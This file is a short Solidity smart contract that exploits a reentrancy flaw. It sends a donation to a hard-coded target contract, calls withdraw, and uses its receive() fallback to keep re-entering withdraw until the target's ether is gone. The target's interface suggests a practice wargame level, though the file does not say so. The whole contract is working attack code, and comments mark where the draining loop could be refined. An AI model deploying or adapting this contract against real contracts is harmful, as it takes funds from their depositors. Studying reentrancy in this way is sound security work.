// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Reentrancy {

    address target = 0xF76F0e0ae786F6092cDad1F116ac309D3Ca5Ed83;
    uint amount = 1000000000000000;
    event TestUint(uint);
    event TestBool(bool);

    function donate() public payable {

        bytes memory payload1 = abi.encodeWithSignature("donate(address)", address(this));
        (bool success1, ) = payable(target).call{value:amount}(payload1);
        assert(success1);
    }

    function balance() public {

        bytes memory payload2 = abi.encodeWithSignature("balanceOf(address)", address(this));
        (bool success2, ) = target.call(payload2);
        assert(success2);
    }

    function yoink() public {

        uint target_bal = target.balance;
        bytes memory payload;

        if(amount > target_bal) {
            payload = abi.encodeWithSignature("withdraw(uint256)", target_bal);
        } else {
            payload = abi.encodeWithSignature("withdraw(uint256)", amount);
        }

        (bool success, ) = target.call(payload);
        emit TestBool(success);
    }

    receive() external payable {

        // Check if enough money is available before re-entering (?)
        // Re-check how exceptions stop

        yoink();
    }
}